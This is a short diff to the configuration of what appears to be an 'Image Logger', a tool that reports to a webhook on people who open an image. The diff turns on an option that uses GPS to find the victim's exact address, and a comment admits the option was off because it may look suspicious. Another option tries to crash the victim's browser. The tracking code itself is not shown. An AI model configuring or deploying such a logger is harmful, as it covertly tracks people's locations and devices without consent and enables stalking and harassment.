@@ -16,12 +16,12 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
